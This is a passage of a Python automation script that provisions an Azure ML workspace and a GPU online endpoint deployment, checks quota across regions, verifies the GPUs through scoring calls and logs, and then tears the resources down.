        t0 = time.time()
        while time.time() - t0 < 600:
            rst, rb = arm(tok, wurl, timeout=90)
            ws_state = prov_state(rb)
            emit({"step": "ws-poll", "http": rst, "state": ws_state,
                  "t": round(time.time() - t0)})
            if ws_state in ("Succeeded", "Failed", "Canceled"):
                break
            time.sleep(12)
    emit({"step": "ws-final", "state": ws_state})
    res["workspace_state"] = ws_state
    if ws_state != "Succeeded":
        emit({"step": "region-abort", "why": "workspace not created",
              "state": ws_state})
        teardown(tok, sid, base, rbase, own, res)
        return res

    wsu = base + "/Microsoft.MachineLearningServices/workspaces/" + ws
    st, wb = arm(tok, wurl, timeout=90)
    msi = (((wb.get("identity") or {}).get("principalId"))
           if isinstance(wb, dict) else None)
    res["ws_msi"] = bool(msi)
    emit({"step": "ws-readback", "http": st, "state": prov_state(wb),
          "msi_ok": bool(msi), "loc": wb.get("location") if isinstance(wb, dict) else None})
    if msi:
        grant(tok, sid, rbase + "/Microsoft.Storage/storageAccounts/" + sa, msi,
              "ba92f5b4-2d11-453d-a403-e96b0029c9fe", "ws-msi-blob")

    # ---------- C. permission / endpoint-writability pre-check ----------
    perm_url = (wsu + "/providers/Microsoft.Authorization/permissions?api-version=2022-04-01")
    st, pb = arm(tok, perm_url, timeout=90)
    got = []
    for p in ((pb.get("value") or []) if isinstance(pb, dict) else []):
        got.append({"actions": (p.get("actions") or [])[:12],
                    "notActions": (p.get("notActions") or [])[:4],
                    "scope": (p.get("scope") or "")[-70:]})
    st2, lb = arm(tok, wsu + "/onlineEndpoints?api-version=" + API_W, timeout=90)
    res["perm"] = {"http": st, "n": len(got), "entries": got[:6],
                   "online_endpoints_read_http": st2,
                   "online_endpoints_list_n": len((lb.get("value") or [])
                                                  if isinstance(lb, dict) else [])}
    emit({"step": "perm", "http": st, "n": len(got),
          "entries": got[:4], "online_endpoints_read_http": st2})

    # ---------- D. endpoint (writability test) ----------
    eurl = wsu + "/onlineEndpoints/" + ENDPOINT + "?api-version=" + API_W
    st, eb = arm(tok, eurl, "PUT",
                 {"location": loc, "tags": {"c211": NONCE},
                  "identity": {"type": "SystemAssigned"},
                  "properties": {"authMode": "Key",
                                 "description": "c211 i126632 nonce"}},
                 timeout=180)
    res["endpoint"]["create_http"] = st
    res["endpoint"]["create"] = err_of(st, eb) if st not in (200, 201, 202) else {"http": st}
    emit({"step": "endpoint-create", **err_of(st, eb)})
    ep_state = None
    if st in (200, 201, 202):
        own["ep"] = ENDPOINT

    # ---------- E. SDK-side code asset + environment ----------
    sdk_assets(sid, RG, ws, res)
    code_id = ((res["sdk"].get("code") or {}).get("id"))
    env_id = ((res["sdk"].get("env") or {}).get("id"))
    if not code_id:
        code_id = manual_code_asset(tok, wsu, res)
    if not code_id:
        code_id = datastore_code_asset(tok, wsu, res)
    if not env_id:
        env_id = manual_env_asset(tok, wsu, res)
    res["code_id"] = code_id
    res["env_id"] = env_id
    emit({"step": "assets-final", "code_ok": bool(code_id),
          "env_ok": bool(env_id)})
    if not code_id:
        emit({"step": "region-abort", "why": "no code asset (own-code defect; "
                                             "not a provider refusal)"})
        # endpoint may still be provisioning: clean it up
        if own.get("ep"):
            for _ in range(30):
                rst, rb = arm(tok, eurl, timeout=90)
                ep_state = prov_state(rb)
                if ep_state in ("Succeeded", "Failed", "Canceled"):
                    break
                time.sleep(10)
        teardown(tok, sid, base, rbase, own, res)
        return res

    # ---------- F. poll endpoint ----------
    if st in (200, 201, 202):
        t0 = time.time()
        while time.time() - t0 < 420:
            rst, rb = arm(tok, eurl, timeout=90)
            ep_state = prov_state(rb)
            rp = (rb.get("properties") or {}) if isinstance(rb, dict) else {}
            emit({"step": "endpoint-poll", "http": rst, "state": ep_state,
                  "t": round(time.time() - t0),
                  "scoring_uri": rp.get("scoringUri")})
            if ep_state in ("Succeeded", "Failed", "Canceled"):
                break
            time.sleep(12)
    res["endpoint"]["state"] = ep_state
    if ep_state != "Succeeded":
        emit({"step": "region-abort", "why": "endpoint not created", "state": ep_state})
        teardown(tok, sid, base, rbase, own, res)
        return res

    # ---------- G. deployment via azure-ai-ml entity (one ON-DEMAND instance) ----------
    dep_state = None
    dep_tries = []
    score_out = None
    for sku in SKU_LADDER:
        if left() < 500:
            break
        durl = (wsu + "/onlineEndpoints/" + ENDPOINT + "/deployments/" + DEPLOYMENT +
                "?api-version=" + API_W)
        create = {}
        # primary: SDK entity (correct managed-online serialization)
        try:
            from azure.ai.ml import MLClient
            from azure.identity import AzureCliCredential
            from azure.ai.ml.entities import (ManagedOnlineDeployment,
                                              CodeConfiguration)
            ml = MLClient(credential=AzureCliCredential(), subscription_id=sid,
                          resource_group_name=RG, workspace_name=ws)
            dep = ManagedOnlineDeployment(
                name=DEPLOYMENT, endpoint_name=ENDPOINT,
                code_configuration=CodeConfiguration(code=code_id,
                                                     scoring_script="score.py"),
                environment=env_id, instance_type=sku, instance_count=CAP,
                app_insights_enabled=False,
                environment_variables={"C211_NONCE": NONCE},
                description=TAGLINE)
            poller = ml.online_deployments.begin_create_or_update(
                dep, skip_script_validation=True)
            create = {"via": "sdk", "http": 200,
                      "status": str(getattr(poller, "status", lambda: "?")())}
            emit({"step": "dep-create", "sku": sku, **create})
        except Exception as e:  # noqa: BLE001
            create = {"via": "sdk", "http": -1, "err": repr(e)[:1400]}
            emit({"step": "dep-create", "sku": sku, "ok": False,
                  "err": repr(e)[:1400]})
        if create.get("http") != 200:
            # fallback: corrected ARM body (sku.name MUST be 'Default',
            # instance count lives in sku.capacity, no instanceCount member)
            body = {"location": loc, "tags": {"c211": NONCE},
                    "sku": {"name": "Default", "capacity": CAP},
                    "properties": {"endpointComputeType": "Managed",
                                   "instanceType": sku,
                                   "environmentId": env_id,
                                   "environmentVariables": {"C211_NONCE": NONCE},
                                   "appInsightsEnabled": False,
                                   "codeConfiguration": {"codeId": code_id,
                                                         "scoringScript": "score.py"}}}
            st, db = arm(tok, durl, "PUT", body, timeout=300)
            create = {"via": "arm", "http": st, **err_of(st, db)}
            emit({"step": "dep-create", "sku": sku, **create})
        dep_tries.append({"sku": sku, **create})
        if create.get("http") in (200, 201, 202):
            own["dep"] = DEPLOYMENT
            t0 = time.time()
            rb = {}
            budget = min(2100, max(600, left() - 420))
            while time.time() - t0 < budget:
                time.sleep(20)
                rst, rb = arm(tok, durl, timeout=120)
                dep_state = prov_state(rb)
                rp = (rb.get("properties") or {}) if isinstance(rb, dict) else {}
                emit({"step": "dep-poll", "http": rst, "state": dep_state,
                      "t": round(time.time() - t0),
                      "provisioning": rp.get("provisioningState"),
                      "error": (json.dumps(rp.get("error"))[:500]
                                if rp.get("error") else None)})
                if dep_state in ("Succeeded", "Failed", "Canceled"):
                    break
            if dep_state == "Succeeded":
                break
            # capacity/quota style refusal -> next SKU / next region is meaningful
            try:
                rp = (rb.get("properties") or {}) if isinstance(rb, dict) else {}
                errtxt = json.dumps(rp.get("error") or {})
            except Exception:  # noqa: BLE001
                errtxt = ""
            if dep_state == "Failed":
                res["last_dep_error"] = errtxt[:1200]
                if re.search(r"(?i)quota|capacity|insufficient|stock|unavailable",
                             errtxt):
                    res["try_next_region"] = True
            break
        else:
            # create refused: quota/capacity style is worth a different SKU/region
            msg = json.dumps(create)
            if re.search(r"(?i)quota|capacity|insufficient|stock|unavailable", msg):
                res["try_next_region"] = True
                continue
            break
    res["deployment"] = {"state": dep_state, "tries": dep_tries}
    emit({"step": "dep-final", "state": dep_state, "tries": len(dep_tries)})

    # ---------- G2. TRAFFIC: point 100% of endpoint traffic at the deployment ----
    # x125825 root cause: the endpoint's traffic map stayed empty, so every score
    # POST returned HTTP 404 "No valid deployments to route to ... positive weight
    # values" (our own code defect, not a provider refusal).  Fix: explicitly set
    # properties.traffic = {DEPLOYMENT: 100} before scoring and read it back.
    traffic_rb = None
    if dep_state == "Succeeded":
        ebase = wsu + "/onlineEndpoints/" + ENDPOINT
        shapes = [
            ("patch-props", "PATCH", {"properties": {"traffic": {DEPLOYMENT: 100}}}),
            ("patch-top", "PATCH", {"traffic": {DEPLOYMENT: 100}}),
            ("put-full", "PUT", {"location": loc, "tags": {"c211": NONCE},
                                 "identity": {"type": "SystemAssigned"},
                                 "properties": {"authMode": "Key",
                                                "description": "c211 i126632 nonce",
                                                "traffic": {DEPLOYMENT: 100}}}),
        ]
        traffic_calls = []
        for label, meth, body in shapes:
            stt, tbb = arm(tok, ebase + "?api-version=" + API_W, meth, body,
                           timeout=300)
            traffic_calls.append({"shape": label, **err_of(stt, tbb)})
            emit({"step": "traffic-set", "shape": label, **err_of(stt, tbb)})
            if stt in (200, 201, 202):
                break
        sdk_traffic_err = None
        t0 = time.time()
        while time.time() - t0 < 240:
            stt2, tb2 = arm(tok, ebase + "?api-version=" + API_W, timeout=90)
            rtp = (tb2.get("properties") or {}) if isinstance(tb2, dict) else {}
            traffic_rb = rtp.get("traffic")
            epst = rtp.get("provisioningState")
            emit({"step": "traffic-poll", "http": stt2, "traffic": traffic_rb,
                  "state": epst, "t": round(time.time() - t0)})
            if (isinstance(traffic_rb, dict) and traffic_rb.get(DEPLOYMENT) == 100
                    and epst == "Succeeded"):
                break
            if time.time() - t0 > 30 and not isinstance(traffic_rb, dict):
                break
            time.sleep(15)
        if not (isinstance(traffic_rb, dict) and traffic_rb.get(DEPLOYMENT) == 100):
            # SDK fallback: ManagedOnlineEndpoint.traffic via azure-ai-ml
            try:
                from azure.ai.ml import MLClient
                from azure.identity import AzureCliCredential
                from azure.ai.ml.entities import ManagedOnlineEndpoint
                _mlt = MLClient(credential=AzureCliCredential(), subscription_id=sid,
                                resource_group_name=RG, workspace_name=ws)
                _epx = ManagedOnlineEndpoint(name=ENDPOINT,
                                             traffic={DEPLOYMENT: 100})
                _pp = _mlt.online_endpoints.begin_create_or_update(_epx)
                try:
                    _pp.result(timeout=900)
                except Exception:  # noqa: BLE001
                    pass
                emit({"step": "traffic-sdk", "ok": True,
                      "status": str(getattr(_pp, "status", lambda: "?")())})
            except Exception as e:  # noqa: BLE001
                sdk_traffic_err = repr(e)[:900]
                emit({"step": "traffic-sdk", "ok": False, "err": sdk_traffic_err})
            stt3, tb3 = arm(tok, ebase + "?api-version=" + API_W, timeout=90)
            rtp3 = (tb3.get("properties") or {}) if isinstance(tb3, dict) else {}
            traffic_rb = rtp3.get("traffic")
            emit({"step": "traffic-final", "http": stt3, "traffic": traffic_rb,
                  "sdk_err": sdk_traffic_err})
        res["traffic"] = {"calls": traffic_calls, "readback": traffic_rb}
        fetch_dep_logs(tok, wsu, res, "post-deploy", tail=2000)

    # ---------- H. scoring URI + key + POST ----------
    if dep_state == "Succeeded":
        st, rb = arm(tok, eurl, timeout=90)
        rp = (rb.get("properties") or {}) if isinstance(rb, dict) else {}
        scoring = rp.get("scoringUri")
        # FIX (i126632): eurl already carries ?api-version=..., so the i126632 form
        # eurl + "/listKeys?api-version=..." requested
        #   .../onlineEndpoints/<ep>?api-version=2024-10-01/listKeys?api-version=2024-10-01
        # which ARM answered HTTP 405 (key=None -> no score POST).  Build the
        # listKeys path on a query-free base URL.
        ebase = wsu + "/onlineEndpoints/" + ENDPOINT
        stk, kb = arm(tok, ebase + "/listKeys?api-version=" + API_W, "POST", {},
                      timeout=90)
        key = None
        if isinstance(kb, dict):
            for k in ("PrimaryKey", "primaryKey", "primary_key", "Key1", "key1"):
                if kb.get(k):
                    key = kb[k]
                    break
        sdk_keys_err = None
        if not key:
            # fallback: azure-ai-ml OnlineEndpointOperations.get_keys()
            try:
                from azure.ai.ml import MLClient
                from azure.identity import AzureCliCredential
                _mlk = MLClient(credential=AzureCliCredential(),
                                subscription_id=sid,
                                resource_group_name=RG, workspace_name=ws)
                kk = _mlk.online_endpoints.get_keys(ENDPOINT)
                for attr in ("primary_key", "secondary_key", "key",
                             "access_token"):
                    v = getattr(kk, attr, None)
                    if v:
                        key = v
                        break
                emit({"step": "score-endpoint-sdkkeys", "ok": bool(key),
                      "type": type(kk).__name__})
            except Exception as e:  # noqa: BLE001
                sdk_keys_err = repr(e)[:700]
                emit({"step": "score-endpoint-sdkkeys", "ok": False,
                      "err": sdk_keys_err})
        emit({"step": "score-endpoint", "http": st, "scoring_uri": scoring,
              "keys_http": stk, "key_ok": bool(key),
              "key_names": (list(kb.keys())[:8] if isinstance(kb, dict) else None),
              "sdk_keys_err": sdk_keys_err})
        res["endpoint"].update({"scoring_uri": scoring, "keys_http": stk,
                                "key_ok": bool(key),
                                "sdk_keys_err": sdk_keys_err})
        if scoring and key:
            payload = json.dumps({"input_data": {"x": NONCE}}).encode()
            t0 = time.time()
            last = None
            use_hdr = False
            uuids = set()
            hosts = set()
            attempts = 0
            bodies = []
            need = max(2, CAP)
            while time.time() - t0 < min(1800, max(240, left() - 900)):
                shdrs = {"Authorization": "Bearer " + key,
                         "Content-Type": "application/json"}
                if use_hdr:
                    # documented deployment-specific routing escape hatch named in
                    # the endpoint's own 404 text: route straight to our deployment
                    shdrs["azureml-model-deployment"] = DEPLOYMENT
                sc, sb = httptext(scoring, method="POST", body=payload, headers=shdrs,
                                  timeout=150)
                txt = sb.decode("utf-8", "replace")
                attempts += 1
                last = {"http": sc, "len": len(txt), "attempt": attempts}
                found = sorted(set(re.findall(r"GPU-[0-9a-fA-F-]{16,}", txt)))
                hh = re.findall(r'"host":\s*"([^"]+)"', txt)
                if found:
                    uuids.update(found)
                for h in hh:
                    hosts.add(h)
                emit({"step": "score", "http": sc, "len": len(txt), "hdr": use_hdr,
                      "attempt": attempts, "uuids": found, "hosts": hh[:4],
                      "distinct_uuids": sorted(uuids),
                      "distinct_hosts": sorted(hosts),
                      "body": txt[:1500], "t": round(time.time() - t0)})
                if (sc == 404 and not use_hdr
                        and "No valid deployments" in txt):
                    use_hdr = True
                    emit({"step": "score-header-fallback",
                          "header": "azureml-model-deployment=" + DEPLOYMENT})
                if sc == 200 and txt:
                    bodies.append(txt[:3000])
                    if len(uuids) >= need:
                        break
                if sc in (400, 401, 403) and attempts >= 3:
                    break
                time.sleep(12)
            res["score"] = last or {}
            res["score"]["attempts"] = attempts
            res["score"]["distinct_uuids"] = sorted(uuids)
            res["score"]["distinct_hosts"] = sorted(hosts)
            res["score"]["bodies"] = bodies[-3:]
            res["gpu_uuids"] = sorted(uuids)
        fetch_dep_logs(tok, wsu, res, "post-score", tail=4000)
    else:
        fetch_dep_logs(tok, wsu, res, "pre-deploy-fail", tail=2000)
        st, lg = arm(tok, wsu + "/onlineEndpoints/" + ENDPOINT + "/deployments/" +
                     DEPLOYMENT + "/logs?api-version=" + API_W, timeout=120)
        body = ""
        if isinstance(lg, dict):
            body = json.dumps(lg)[:3000]
        elif isinstance(lg, (bytes, str)):
            body = str(lg)[:3000]
        emit({"step": "dep-logs", "http": st, "body": body[:2500]})
        res["dep_logs"] = {"http": st, "body": body[:2500]}

    # ---------- I. independent readback ----------
    durl = (wsu + "/onlineEndpoints/" + ENDPOINT + "/deployments/" + DEPLOYMENT +
            "?api-version=" + API_W)
    st_d, db2 = arm(tok, durl, timeout=120)
    rp2 = (db2.get("properties") or {}) if isinstance(db2, dict) else {}
    st_e, eb2 = arm(tok, eurl, timeout=90)
    rp3 = (eb2.get("properties") or {}) if isinstance(eb2, dict) else {}
    st_l, lb2 = arm(tok, wsu + "/onlineEndpoints/" + ENDPOINT + "/deployments"
                    "?api-version=" + API_W, timeout=90)
    inst = None
    try:
        inst = [{"name": x.get("name"),
                 "instanceType": ((x.get("properties") or {}).get("instanceType")),
                 "state": ((x.get("properties") or {}).get("provisioningState"))}
                for x in ((lb2.get("value") or []) if isinstance(lb2, dict) else [])]
    except Exception:  # noqa: BLE001
        pass
    res["readback"] = {
        "deployment_http": st_d,
        "deployment_state": rp2.get("provisioningState"),
        "deployment_instanceType": rp2.get("instanceType"),
        "deployment_sku": (db2.get("sku") if isinstance(db2, dict) else None),
        "endpoint_http": st_e,
        "endpoint_state": rp3.get("provisioningState"),
        "endpoint_scoringUri_present": bool(rp3.get("scoringUri")),
        "endpoint_traffic": rp3.get("traffic"),
        "deployments_list_http": st_l, "deployments": inst}
    emit({"step": "readback",
          **{k: v for k, v in res["readback"].items() if k != "deployments"},
          "deployments": inst})
    st, lg = arm(tok, wsu + "/onlineEndpoints/" + ENDPOINT + "/deployments/" +
                 DEPLOYMENT + "/logs?api-version=" + API_W, timeout=120)
    lgtext = ""
    if isinstance(lg, dict):
        lgtext = json.dumps(lg)
        for k in ("content", "log", "text", "raw"):
            if isinstance(lg.get(k), str) and len(lg[k]) > len(lgtext) // 3:
                lgtext = lg[k]
    elif isinstance(lg, (bytes, str)):
        lgtext = str(lg)
    uu = re.findall(r"GPU-[0-9a-fA-F-]{16,}", lgtext)
    res["dep_logs"] = {"http": st, "len": len(lgtext), "uuids": sorted(set(uu)),
                       "excerpt": lgtext[:6000]}
    emit({"step": "dep-logs", "http": st, "len": len(lgtext),
          "uuids": sorted(set(uu)), "head": lgtext[:2000],
          "tail": lgtext[-1200:]})

    # ---------- J. teardown ----------
    teardown(tok, sid, base, rbase, own, res)
    return res


def dump_summary(summary):
    payload = json.dumps(summary, default=str)
    raw = payload.encode()
    n = (len(raw) + 2399) // 2400
    for i in range(n):
        b64 = base64.b64encode(raw[i * 2400:(i + 1) * 2400]).decode()
        emit({"step": "SUMMARY-PART-B64", "i": i, "n": n, "part": b64})
    try:
        if summary.get("out_url"):
            urc, _ub = httptext(summary["out_url"], method="PUT",
                                body=payload.encode(),
                                headers={"x-ms-blob-type": "BlockBlob",
                                         "Content-Type": "application/json"},
                                timeout=120)
            emit({"step": "summary-upload", "http": urc, "len": len(payload)})
    except Exception as e:  # noqa: BLE001
        emit({"step": "summary-upload", "err": str(e)})


def main():
    summary = {"tag": TAG, "nonce": NONCE, "rg": RG, "regions": [],
               "quota": {}, "reap": {}, "cleanup": {}}
    if os.environ.get("C211_DRYRUN") == "1":
        sid = "<SUB>"
        r0 = run(["az", "account", "show", "-o", "json"], timeout=60)
        try:
            sid = json.loads(r0["out"]).get("id") or "<SUB>"
        except Exception:  # noqa: BLE001
            pass
        base = ARM + "/subscriptions/" + sid + "/resourceGroups/" + RG + "/providers"
        plan = []
        for reg in QUOTA_REGIONS:
            for api, ver in (("usages", API_C), ("quotas", API_Q)):
                plan.append("GET " + ARM + "/subscriptions/" + sid +
                            "/providers/Microsoft.MachineLearningServices/locations/" +
                            reg + "/" + api + "?api-version=" + ver)
        for idx, loc in enumerate(REGION_LADDER):
            nm = region_names(idx, loc)
            plan += [
                "PUT (create) " + base + "/Microsoft.Storage/storageAccounts/" + nm["sa"],
                "POST " + base + "/Microsoft.Storage/storageAccounts/" + nm["sa"] + "/listKeys",
                "PUT (container) https://" + nm["sa"] + ".blob.core.windows.net/" + OUTCONT,
                "PUT (create) " + base + "/Microsoft.KeyVault/vaults/" + nm["kv"],
                "PUT (create) " + base + "/Microsoft.MachineLearningServices/workspaces/" + nm["ws"],
                "PUT (roleAssignment) " + base + "/Microsoft.Storage/storageAccounts/" + nm["sa"] +
                "/providers/Microsoft.Authorization/roleAssignments/<uuid>",
                "GET " + base + "/Microsoft.MachineLearningServices/workspaces/" + nm["ws"] +
                "/providers/Microsoft.Authorization/permissions?api-version=2022-04-01",
                "PUT (create) " + base + "/Microsoft.MachineLearningServices/workspaces/" + nm["ws"] +
                "/onlineEndpoints/" + ENDPOINT + "?api-version=" + API_W,
                "PY azure-ai-ml MLClient(datastores.get_default) workspace=" + nm["ws"],
                "PY ml.code.create_or_update(Code(path=./c211code)) -> codes/" + CODE + "/versions/1"
                " (POST .../startPendingUpload + blob PUT + PUT code asset)",
                "PY ml.environments.create_or_update(Environment(image=" + IMG_MAIN + "))",
                "PY ml.online_deployments.begin_create_or_update(ManagedOnlineDeployment("
                "code_configuration=CodeConfiguration(code=<id>,scoring_script=score.py), "
                "environment=<id>, instance_type=<sku>, instance_count=1))",
                "GET (poll) " + base + "/Microsoft.MachineLearningServices/workspaces/" + nm["ws"] +
                "/onlineEndpoints/" + ENDPOINT + "/deployments/" + DEPLOYMENT + "?api-version=" + API_W,
                "POST listKeys " + base + "/Microsoft.MachineLearningServices/workspaces/" + nm["ws"] +
                "/onlineEndpoints/" + ENDPOINT + "/listKeys?api-version=" + API_W,
                "POST scoringUri (nvidia-smi device proof)",
                "GET deployments/<dep>/logs",
                "DELETE deployment/endpoint/workspace/kv/sa and GET 404 readback",
            ]
        emit({"step": "DRYRUN-PLAN", "n": len(plan), "plan": plan})
        emit({"step": "PROBE-EXIT", "code": 0, "dryrun": True})
        return
    r = run(["az", "account", "show", "-o", "json"], timeout=180)
    try:
        acc = json.loads(r["out"])
    except Exception:  # noqa: BLE001
        emit({"step": "FATAL", "why": "no az session", "raw": r["out"][:400]})
        return
    sid = acc.get("id")
    tenant = acc.get("tenantId")
    summary["identity"] = {"sub": sid, "tenant": tenant, "name": acc.get("name"),
                           "state": acc.get("state")}
    emit({"step": "identity", "sub": sid, "tenant": tenant, "name": acc.get("name"),
          "state": acc.get("state")})
    r = run(["az", "account", "get-access-token", "--resource", ARM, "--output", "json"],
            timeout=180)
    tok = None
    try:
        tok = json.loads(r["out"]).get("accessToken")
    except Exception:  # noqa: BLE001
        pass
    emit({"step": "arm-token", "got": bool(tok), "len": len(tok or "")})
    if not sid or not tok:
        emit({"step": "PROBE-EXIT", "code": 1})
        return
    base = ARM + "/subscriptions/" + sid + "/resourceGroups/" + RG + "/providers"
    rbase = base[len(ARM):]

    summary["reap"] = stage_reap(tok, base)
    quota_scan(tok, sid, QUOTA_REGIONS, summary)
    # ---- capacity N from AML locations/{region}/usages (corrected, x126286) ----
    global CAP
    for reg in QUOTA_REGIONS:
        CAP_INFO[reg] = t4_capacity_usages(summary, reg)
        emit({"step": "t4-capacity-usages", **CAP_INFO[reg]})
    summary["t4_capacity"] = CAP_INFO
    best_reg, best_n = None, 0
    for reg in REGION_LADDER:            # westeurope first on ties
        n = int((CAP_INFO.get(reg) or {}).get("n") or 0)
        if n > best_n:
            best_n, best_reg = n, reg
    if best_n < 2:
        summary["elapsed"] = round(time.time() - T0, 1)
        emit({"step": "GATE-capacity", "n": best_n, "cap": CAP_INFO,
              "why": "AML T4 usages free vCPU does not allow 2+ Standard_NC4as_T4_v3 replicas"})
        dump_summary(summary)
        emit({"step": "PROBE-EXIT", "code": 0, "gate": True})
        return
    CAP = best_n
    summary["instance_count"] = CAP
    summary["instance_region"] = best_reg
    emit({"step": "capacity-N", "n": CAP, "region": best_reg, "cap": CAP_INFO})
    if best_reg != REGION_LADDER[0]:
        REGION_LADDER.remove(best_reg)
        REGION_LADDER.insert(0, best_reg)
    for reg in REGION_LADDER:
        summary.setdefault("quota_free", {})[reg] = {
            "t4": free_vcpu(summary["quota"], reg, r"ncas|t4"),
            "nv": free_vcpu(summary["quota"], reg, r"standardnv|nv6|nv12"),
            "a100": free_vcpu(summary["quota"], reg, r"a100|nc24")}
    emit({"step": "quota-free", **summary.get("quota_free", {}), "CAP": CAP, "region": REGION_LADDER[0]})

    for idx, loc in enumerate(REGION_LADDER):
        if idx > 0 and left() < 1500:
            emit({"step": "region-skip", "loc": loc, "why": "deadline"})
            continue
        res = run_region(tok, sid, tenant, base, rbase, idx, loc,
                         summary["quota"], summary)
        if res.get("gpu_uuids"):
            emit({"step": "GPU-PROVEN", "loc": loc, "uuids": res["gpu_uuids"]})
            break
        if not res.get("try_next_region"):
            break
    summary["elapsed"] = round(time.time() - T0, 1)
    dump_summary(summary)
    emit({"step": "PROBE-EXIT", "code": 0})


if __name__ == "__main__":
    main()
